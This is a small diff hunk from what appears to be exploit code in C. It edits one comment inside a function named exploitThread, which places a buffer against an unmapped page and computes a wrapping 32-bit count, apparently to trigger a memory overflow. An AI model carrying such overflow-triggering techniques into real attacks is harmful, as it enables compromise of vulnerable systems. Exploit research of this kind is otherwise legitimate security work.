@@ -105,7 +105,7 @@ void *exploitThread(void *none) {
 	// Ensure end of mapping is unmapped
 	munmap(mapping + mappingSize, PAGE_SIZE);
 	
-	// buffer + bufferSize + overflowSize points to unmapped memory
+	// buffer + copySize points to unmapped memory
 	uint8_t *buffer = mapping + mappingSize - copySize;
 	
 	int64_t count = (0x100000000 + bufferSize) / 4;
